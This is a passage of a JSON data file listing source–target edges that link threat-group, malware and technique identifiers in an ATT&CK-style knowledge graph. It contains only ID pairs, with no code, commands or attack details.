            "target": "T1043"
        },
        {
            "source": "S0410",
            "target": "T1027"
        },
        {
            "source": "G0007",
            "target": "S0410"
        },
        {
            "source": "S0397",
            "target": "T1564.004"
        },
        {
            "source": "S0397",
            "target": "T1547.001"
        },
        {
            "source": "S0397",
            "target": "T1542.001"
        },
        {
            "source": "S0397",
            "target": "T1112"
        },
        {
            "source": "S0397",
            "target": "T1019"
        },
        {
            "source": "S0397",
            "target": "T1014"
        },
        {
            "source": "G0007",
            "target": "S0397"
        },
        {
            "source": "S0351",
            "target": "T1071.003"
        },
        {
            "source": "S0351",
            "target": "T1547.004"
        },
        {
            "source": "S0351",
            "target": "T1124"
        },
        {
            "source": "S0351",
            "target": "T1113"
        },
        {
            "source": "S0351",
            "target": "T1105"
        },
        {
            "source": "S0351",
            "target": "T1083"
        },
        {
            "source": "S0351",
            "target": "T1082"
        },
        {
            "source": "S0351",
            "target": "T1065"
        },
        {
            "source": "S0351",
            "target": "T1057"
        },
        {
            "source": "S0351",
            "target": "T1041"
        },
        {
            "source": "S0351",
            "target": "T1033"
        },
        {
            "source": "G0007",
            "target": "S0351"
        },
        {
            "source": "S0251",
            "target": "T1573.002"
        },
        {
            "source": "S0251",
            "target": "T1071.003"
        },
        {
            "source": "S0251",
            "target": "T1071.001"
        },
        {
            "source": "S0251",
            "target": "T1132.001"
        },
        {
            "source": "S0251",
            "target": "T1074.001"
        },
        {
            "source": "S0251",
            "target": "T1059.003"
        },
        {
            "source": "S0251",
            "target": "T1560"
        },
        {
            "source": "S0251",
            "target": "T1555.003"
        },
        {
            "source": "S0251",
            "target": "T1056.004"
        },
        {
            "source": "S0251",
            "target": "T1027.002"
        },
        {
            "source": "S0251",
            "target": "T1070.004"
        },
        {
            "source": "S0251",
            "target": "T1547.001"
        },
        {
            "source": "S0251",
            "target": "T1037.001"
        },
        {
            "source": "S0251",
            "target": "T1053.005"
        },
        {
            "source": "S0251",
            "target": "T1140"
        },
        {
            "source": "S0251",
            "target": "T1135"
        },
        {
            "source": "S0251",
            "target": "T1124"
        },
        {
            "source": "S0251",
            "target": "T1120"
        },
        {
            "source": "S0251",
            "target": "T1119"
        },
        {
            "source": "S0251",
            "target": "T1113"
        },
        {
            "source": "S0251",
            "target": "T1105"
        },
        {
            "source": "S0251",
            "target": "T1094"
        },
        {
            "source": "S0251",
            "target": "T1083"
        },
        {
            "source": "S0251",
            "target": "T1082"
        },
        {
            "source": "S0251",
            "target": "T1065"
        },
        {
            "source": "S0251",
            "target": "T1057"
        },
        {
            "source": "S0251",
            "target": "T1049"
        },
        {
            "source": "S0251",
            "target": "T1047"
        },
        {
            "source": "S0251",
            "target": "T1041"
        },
        {
            "source": "S0251",
            "target": "T1033"
        },
        {
            "source": "S0251",
            "target": "T1016"
        },
        {
            "source": "S0251",
            "target": "T1012"
        },
        {
            "source": "G0007",
            "target": "S0251"
        },
        {
            "source": "G0007",
            "target": "S0250"
        },
        {
            "source": "S0243",
            "target": "T1071.001"
        },
        {
            "source": "S0243",
            "target": "T1059.003"
        },
        {
            "source": "S0243",
            "target": "T1203"
        },
        {
            "source": "G0007",
            "target": "S0243"
        },
        {
            "source": "S0193",
            "target": "T1202"
        },
        {
            "source": "S0193",
            "target": "T1083"
        },
        {
            "source": "S0193",
            "target": "T1005"
        },
        {
            "source": "G0007",
            "target": "S0193"
        },
        {
            "source": "G0007",
            "target": "S0191"
        },
        {
            "source": "S0174",
            "target": "T1557.001"
        },
        {
            "source": "S0174",
            "target": "T1040"
        },
        {
            "source": "G0007",
            "target": "S0174"
        },
        {
            "source": "S0161",
            "target": "T1071.002"
        },
        {
            "source": "S0161",
            "target": "T1555.003"
        },
        {
            "source": "S0161",
            "target": "T1056.001"
        },
        {
            "source": "S0161",
            "target": "T1070.004"
        },
        {
            "source": "S0161",
            "target": "T1113"
        },
        {
            "source": "S0161",
            "target": "T1106"
        },
        {
            "source": "S0161",
            "target": "T1083"
        },
        {
            "source": "S0161",
            "target": "T1082"
        },
        {
            "source": "S0161",
            "target": "T1057"
        },
        {
            "source": "S0161",
            "target": "T1033"
        },
        {
            "source": "G0007",
            "target": "S0161"
        },
        {
            "source": "G0007",
            "target": "S0160"
        },
        {
            "source": "S0162",
            "target": "T1573.001"
        },
        {
            "source": "S0162",
            "target": "T1071.001"
        },
        {
            "source": "S0162",
            "target": "T1564.001"
        },
        {
            "source": "S0162",
            "target": "T1070.004"
        },
        {
            "source": "S0162",
            "target": "T1543.001"
        },
        {
            "source": "S0162",
            "target": "T1057"
        },
        {
            "source": "S0162",
            "target": "T1033"
        },
        {
            "source": "G0007",
            "target": "S0162"
        },
        {
            "source": "S0138",
            "target": "T1071.003"
        },
        {
            "source": "S0138",
            "target": "T1071.001"
        },
        {
            "source": "S0138",
            "target": "T1555.003"
        },
        {
            "source": "S0138",
            "target": "T1555"
        },
        {
            "source": "S0138",
            "target": "T1036.005"
        },
        {
            "source": "S0138",
            "target": "T1027"
        },
        {
            "source": "G0007",
            "target": "S0138"
        },
        {
            "source": "S0137",
            "target": "T1573.001"
        },
        {
            "source": "S0137",
            "target": "T1071.003"
        },
        {
            "source": "S0137",
            "target": "T1071.001"
        },
        {
            "source": "S0137",
            "target": "T1132.001"
        },
        {
            "source": "S0137",
            "target": "T1027.001"
        },
        {
            "source": "S0137",
            "target": "T1547.001"
        },
        {
            "source": "S0137",
            "target": "T1218.011"
        },
        {
            "source": "S0137",
            "target": "T1105"
        },
        {
            "source": "S0137",
            "target": "T1082"
        },
        {
            "source": "S0137",
            "target": "T1027"
        },
        {
            "source": "G0007",
            "target": "S0137"
        },
        {
            "source": "S0136",
            "target": "T1074.001"
        },
        {
            "source": "S0136",
            "target": "T1052.001"
        },
        {
            "source": "S0136",
            "target": "T1036.005"
        },
        {
            "source": "S0136",
            "target": "T1070.006"
        },
        {
            "source": "S0136",
            "target": "T1070.004"
        },
        {
            "source": "S0136",
            "target": "T1547.001"
        },
        {
            "source": "S0136",
            "target": "T1120"
        },
        {
            "source": "S0136",
            "target": "T1119"
        },
        {
            "source": "S0136",
            "target": "T1092"
        },
        {
            "source": "S0136",
            "target": "T1091"
        },
        {
            "source": "S0136",
            "target": "T1083"
        },
        {
            "source": "S0136",
            "target": "T1027"
        },
        {
            "source": "S0136",
            "target": "T1025"
        },
        {
            "source": "S0136",
            "target": "T1020"
        },
        {
            "source": "G0007",
            "target": "S0136"
        },
        {
            "source": "S0135",
            "target": "T1055.001"
        },
        {
            "source": "S0135",
            "target": "T1014"
        },
        {
            "source": "G0007",
            "target": "S0135"
        },
        {
            "source": "S0134",
            "target": "T1573.001"
        },
        {
            "source": "S0134",
            "target": "T1001.001"
        },
        {
            "source": "S0134",
            "target": "T1574.001"
        },
        {
            "source": "S0134",
            "target": "T1548.002"
        },
        {
            "source": "S0134",
            "target": "T1105"
        },
        {
            "source": "G0007",
            "target": "S0134"
        },
        {
            "source": "S0117",
            "target": "T1573.002"
        },
        {
            "source": "S0117",
            "target": "T1059.003"
        },
        {
            "source": "S0117",
            "target": "T1027.001"
        },
        {
            "source": "S0117",
            "target": "T1552.001"
        },
        {
            "source": "S0117",
            "target": "T1090"
        },
        {
            "source": "S0117",
            "target": "T1046"
        },
        {
            "source": "S0117",
            "target": "T1027"
        },
        {
            "source": "S0117",
            "target": "T1008"
        },
        {
            "source": "G0007",
            "target": "S0117"
        },
        {
            "source": "S0045",
            "target": "T1573.002"
        },
        {
            "source": "S0045",
            "target": "T1573.001"
        },
        {
            "source": "S0045",
            "target": "T1546.015"
        },
        {
            "source": "S0045",
            "target": "T1071.001"
        },
        {
            "source": "S0045",
            "target": "T1132.001"
        },
        {
            "source": "S0045",
            "target": "T1074.001"
        },
        {
            "source": "S0045",
            "target": "T1059.003"
        },
        {
            "source": "S0045",
            "target": "T1560.003"
        },
        {
            "source": "S0045",
            "target": "T1560"
        },
        {
            "source": "S0045",
            "target": "T1056.001"
        },
        {
            "source": "S0045",
            "target": "T1070.004"
        },
        {
            "source": "S0045",
            "target": "T1547.001"
        },
        {
            "source": "S0045",
            "target": "T1218.011"
        },
        {
            "source": "S0045",
            "target": "T1120"
        },
        {
            "source": "S0045",
            "target": "T1112"
        },
        {
            "source": "S0045",
            "target": "T1106"
        },
        {
            "source": "S0045",
            "target": "T1083"
        },
        {
            "source": "S0045",
            "target": "T1082"
        },
        {
            "source": "S0045",
            "target": "T1057"
        },
        {
            "source": "S0045",
            "target": "T1043"
        },
        {
            "source": "S0045",
            "target": "T1041"
        },
        {
            "source": "S0045",
            "target": "T1029"
        },
        {
            "source": "S0045",
            "target": "T1027"
        },
        {
            "source": "S0045",
            "target": "T1012"
        },
        {
            "source": "G0007",
            "target": "S0045"
        },
        {
            "source": "S0044",
            "target": "T1546.015"
        },
        {
            "source": "S0044",
            "target": "T1071.001"
        },
        {
            "source": "S0044",
            "target": "T1132.001"
        },
        {
            "source": "S0044",
            "target": "T1059.003"
        },
        {
            "source": "S0044",
            "target": "T1070.004"
        },
        {
            "source": "S0044",
            "target": "T1547.001"
        },
        {
            "source": "S0044",
            "target": "T1218.011"
        },
        {
            "source": "S0044",
            "target": "T1543.003"
        },
        {
            "source": "S0044",
            "target": "T1037.001"
        },
        {
            "source": "S0044",
            "target": "T1053.005"
        },
        {
            "source": "S0044",
            "target": "T1115"
        },
        {
            "source": "S0044",
            "target": "T1113"
        },
        {
            "source": "S0044",
            "target": "T1105"
        },
        {
            "source": "S0044",
            "target": "T1082"
        },
        {
            "source": "S0044",
            "target": "T1068"
        },
        {
            "source": "S0044",
            "target": "T1057"
        },
        {
            "source": "S0044",
            "target": "T1055"
        },
        {
            "source": "S0044",
            "target": "T1027"
        },
        {
            "source": "S0044",
            "target": "T1016"
        },
        {
            "source": "S0044",
            "target": "T1008"
        },
        {
            "source": "G0007",
            "target": "S0044"
        },
        {
            "source": "S0023",
            "target": "T1573.002"
        },
        {
            "source": "S0023",
            "target": "T1573.001"
        },
        {
            "source": "S0023",
            "target": "T1071.003"
        },
        {
            "source": "S0023",
            "target": "T1071.001"
        },
        {
            "source": "S0023",
            "target": "T1090.001"
        },
        {
            "source": "S0023",
            "target": "T1568.002"
        },
        {
            "source": "S0023",
            "target": "T1518.001"
        },
        {
            "source": "S0023",
            "target": "T1056.001"
        },
        {
            "source": "S0023",
            "target": "T1497"
        },
        {
            "source": "S0023",
            "target": "T1113"
        },
        {
            "source": "S0023",
            "target": "T1112"
        },
        {
            "source": "S0023",
            "target": "T1105"
        },
        {
            "source": "S0023",
            "target": "T1092"
        },
        {
            "source": "S0023",
            "target": "T1091"
        },
        {
            "source": "S0023",
            "target": "T1083"
        },
        {
            "source": "S0023",
            "target": "T1059"
        },
        {
            "source": "S0023",
            "target": "T1012"
        },
        {
            "source": "S0023",
            "target": "T1008"
        },
        {
            "source": "G0007",
            "target": "S0023"
        },
        {
            "source": "G0007",
            "target": "S0002"
        },
        {
            "source": "S0314",
            "target": "T1444"
        },
        {
            "source": "S0314",
            "target": "T1430"
        },
        {
            "source": "G0007",
            "target": "S0314"
        },
        {
            "source": "S0345",
            "target": "T1071.001"
        },
        {
            "source": "S0345",
            "target": "T1059.003"
        },
        {
            "source": "S0345",
            "target": "T1036.004"
        },
        {
            "source": "S0345",
            "target": "T1070.004"
        },
        {
            "source": "S0345",
            "target": "T1547.001"
        },
        {
            "source": "S0345",
            "target": "T1543.003"
        },
        {
            "source": "S0345",
            "target": "T1105"
        },
        {
            "source": "S0345",
            "target": "T1094"
        },
        {
            "source": "S0345",
            "target": "T1083"
        },
        {
            "source": "S0345",
            "target": "T1057"
        },
        {
            "source": "S0345",
            "target": "T1027"
        },
        {
            "source": "G0006",
            "target": "S0345"
        },
        {
            "source": "S0123",
            "target": "T1569.002"
        },
        {
            "source": "G0006",
            "target": "S0123"
        },
        {
            "source": "S0122",
            "target": "T1550.002"
        },
        {
            "source": "G0006",
            "target": "S0122"
        },
        {
            "source": "S0121",
            "target": "T1003.001"
        },
        {
            "source": "G0006",
            "target": "S0121"
        },
        {
            "source": "S0119",
            "target": "T1003.005"
        },
        {
            "source": "G0006",
            "target": "S0119"
        },
        {
            "source": "S0109",
            "target": "T1574.001"
        },
        {
            "source": "S0109",
            "target": "T1059.003"
        },
        {
            "source": "S0109",
            "target": "T1105"
        },
        {
            "source": "G0006",
            "target": "S0109"
        },
        {
            "source": "G0006",
            "target": "S0100"
        },
        {
            "source": "G0006",
            "target": "S0057"
        },
        {
            "source": "G0006",
            "target": "S0039"
        },
        {
            "source": "G0006",
            "target": "S0029"
        },
        {
            "source": "S0026",
            "target": "T1102.002"
        },
        {
            "source": "G0006",
            "target": "S0026"
        },
        {
            "source": "S0025",
            "target": "T1102.002"
        },
        {
            "source": "S0025",
            "target": "T1059.003"
        },
        {
            "source": "G0006",
            "target": "S0025"
        },
        {
            "source": "S0017",
            "target": "T1573.002"
        },
        {
            "source": "S0017",
            "target": "T1059.003"
        },
        {
            "source": "S0017",
            "target": "T1056.001"
        },
        {
            "source": "S0017",
            "target": "T1113"
        },
        {
            "source": "S0017",
            "target": "T1105"
        },
        {
            "source": "S0017",
            "target": "T1094"
        },
        {
            "source": "S0017",
            "target": "T1082"
        },
        {
            "source": "S0017",
            "target": "T1057"
        },
        {
            "source": "S0017",
            "target": "T1033"
        },
        {
            "source": "S0017",
            "target": "T1008"
        },
        {
            "source": "G0006",
            "target": "S0017"
        },
        {
            "source": "G0006",
            "target": "S0012"
        },
        {
            "source": "G0006",
            "target": "S0008"
        },
        {
            "source": "G0006",
            "target": "S0006"
        },
        {
            "source": "G0006",
            "target": "S0002"
        },
        {
            "source": "G0005",
            "target": "S0040"
        },
        {
            "source": "S0015",
            "target": "T1071.001"
        },
        {
            "source": "S0015",
            "target": "T1132.001"
        },
        {
            "source": "S0015",
            "target": "T1059.003"
        },
        {
            "source": "S0015",
            "target": "T1564.001"
        },
        {
            "source": "S0015",
            "target": "T1036.005"
        },
        {
            "source": "S0015",
            "target": "T1070.004"
        },
        {
            "source": "S0015",
            "target": "T1547.001"
        },
        {
            "source": "S0015",
            "target": "T1105"
        },
        {
            "source": "S0015",
            "target": "T1083"
        },
        {
            "source": "S0015",
            "target": "T1082"
        },
        {
            "source": "S0015",
            "target": "T1057"
        },
        {
            "source": "S0015",
            "target": "T1043"
        },
        {
            "source": "S0015",
            "target": "T1033"
        },
        {
            "source": "S0015",
            "target": "T1016"
        },
        {
            "source": "S0015",
            "target": "T1007"
        },
        {
            "source": "S0015",
            "target": "T1005"
        },
        {
            "source": "G0005",
            "target": "S0015"
        },
        {
            "source": "S0003",
            "target": "T1573.001"
        },
        {
            "source": "S0003",
            "target": "T1071.001"
        },
        {
            "source": "S0003",
            "target": "T1043"
        },
        {
            "source": "G0005",
            "target": "S0003"
        },
        {
            "source": "S0439",
            "target": "T1573.001"
        },
        {
            "source": "S0439",
            "target": "T1071.001"
        },
        {
            "source": "S0439",
            "target": "T1001.003"
        },
        {
            "source": "S0439",
            "target": "T1132.001"
        },
        {
            "source": "S0439",
            "target": "T1090.002"
        },
        {
            "source": "S0439",
            "target": "T1569.002"
        },
        {
            "source": "S0439",
            "target": "T1059.003"
        },
        {
            "source": "S0439",
            "target": "T1497.003"
        },
        {
            "source": "S0439",
            "target": "T1497.002"
        },
        {
            "source": "S0439",
            "target": "T1497.001"
        },
        {
            "source": "S0439",
            "target": "T1564.001"
        },
        {
            "source": "S0439",
            "target": "T1003.005"
        },
        {
            "source": "S0439",
            "target": "T1560.003"
        },
        {
            "source": "S0439",
            "target": "T1560.001"
        },
        {
            "source": "S0439",
            "target": "T1134.001"
        },
        {
            "source": "S0439",
            "target": "T1056.001"
        },
        {
            "source": "S0439",
            "target": "T1003.001"
        },
        {
            "source": "S0439",
            "target": "T1036.004"
        },
        {
            "source": "S0439",
            "target": "T1027.003"
        },
        {
            "source": "S0439",
            "target": "T1070.004"
        },
        {
            "source": "S0439",
            "target": "T1547.009"
        },
        {
            "source": "S0439",
            "target": "T1547.001"
        },
        {
            "source": "S0439",
            "target": "T1543.003"
        },
        {
            "source": "S0439",
            "target": "T1053.005"
        },
        {
            "source": "S0439",
            "target": "T1140"
        },
        {
            "source": "S0439",
            "target": "T1124"
        },
        {
            "source": "S0439",
            "target": "T1105"
        },
        {
            "source": "S0439",
            "target": "T1083"
        },
        {
            "source": "S0439",
            "target": "T1082"
        },
        {
            "source": "S0439",
            "target": "T1049"
        },
        {
            "source": "S0439",
            "target": "T1041"
        },
        {
            "source": "S0439",
            "target": "T1033"
        },
        {
            "source": "S0439",
            "target": "T1016"
        },
        {
            "source": "G0004",
            "target": "S0439"
        },
        {
            "source": "S0280",
            "target": "T1574.001"
        },
        {
            "source": "S0280",
            "target": "T1059.003"
        },
        {
            "source": "S0280",
            "target": "T1140"
        },
        {
            "source": "S0280",
            "target": "T1082"
        },
        {
            "source": "S0280",
            "target": "T1043"
        },
        {
            "source": "S0280",
            "target": "T1033"
        },
        {
            "source": "G0004",
            "target": "S0280"
        },
        {
            "source": "S0227",
            "target": "T1213.002"
        },
        {
            "source": "G0004",
            "target": "S0227"
        },
        {
            "source": "G0004",
            "target": "S0104"
        },
        {
            "source": "G0004",
            "target": "S0100"
        },
        {
            "source": "G0004",
            "target": "S0097"
        },
        {
            "source": "G0004",
            "target": "S0096"
        },
        {
            "source": "G0004",
            "target": "S0057"
        },
        {
            "source": "G0004",
            "target": "S0039"
        },
        {
            "source": "G0004",
            "target": "S0002"
        },
        {
            "source": "S0056",
            "target": "T1569.002"
        },
        {
            "source": "S0056",
            "target": "T1003.001"
        },
        {
            "source": "S0056",
            "target": "T1110.002"
        },
        {
            "source": "S0056",
            "target": "T1021.002"
        },
        {
            "source": "G0003",
            "target": "S0056"
        },
        {
            "source": "G0003",
            "target": "S0029"
        },
        {
            "source": "S0004",
            "target": "T1059.003"
        },
        {
            "source": "S0004",
            "target": "T1562.001"
        },
        {
            "source": "S0004",
            "target": "T1056.001"
        },
        {
            "source": "S0004",
            "target": "T1547.009"
        },
        {
            "source": "S0004",
            "target": "T1547.001"
        },
        {
            "source": "S0004",
            "target": "T1543.003"
        },
        {
            "source": "S0004",
            "target": "T1115"
        },
        {
            "source": "S0004",
            "target": "T1113"
        },
        {
            "source": "G0003",
            "target": "S0004"
        },
        {
            "source": "G0003",
            "target": "S0002"
        },
        {
            "source": "G0002",
            "target": "S0012"
        },
        {
            "source": "G0001",
            "target": "S0412"
        },
        {
            "source": "G0001",
            "target": "S0203"
        },
        {
            "source": "G0001",
            "target": "S0021"
        },
        {
            "source": "S0009",
            "target": "T1553.006"
        },
        {
            "source": "S0009",
            "target": "T1573.001"
        },
        {
            "source": "S0009",
            "target": "T1071.001"
        },
        {
            "source": "S0009",
            "target": "T1090.001"
        },
        {
            "source": "S0009",
            "target": "T1574.001"
        },
        {
            "source": "S0009",
            "target": "T1059.003"
        },
        {
            "source": "S0009",
            "target": "T1553.004"
        },
        {
            "source": "S0009",
            "target": "T1014"
        },
        {
            "source": "G0001",
            "target": "S0009"
        },
        {
            "source": "S0421",
            "target": "T1533"
        },
        {
            "source": "S0421",
            "target": "T1532"
        },
        {
            "source": "S0421",
            "target": "T1512"
        },
        {
            "source": "S0421",
            "target": "T1513"
        },
        {
            "source": "S0421",
            "target": "T1476"
        },
        {
            "source": "S0421",
            "target": "T1424"
        },
        {
            "source": "S0421",
            "target": "T1437"
        },
        {
            "source": "S0421",
            "target": "T1406"
        },
        {
            "source": "S0421",
            "target": "T1447"
        },
        {
            "source": "S0421",
            "target": "T1402"
        },
        {
            "source": "S0421",
            "target": "T1418"
        },
        {
            "source": "S0421",
            "target": "T1414"
        },
        {
            "source": "S0421",
            "target": "T1426"
        },
        {
            "source": "S0421",
            "target": "T1412"
        },
        {
            "source": "S0421",
            "target": "T1429"
        },
        {
            "source": "S0421",
            "target": "T1430"
        },
        {
            "source": "S0421",
            "target": "T1432"
        },
        {
            "source": "S0421",
            "target": "T1433"
        },
        {
            "source": "G0097",
            "target": "S0421"
        }
    ]
}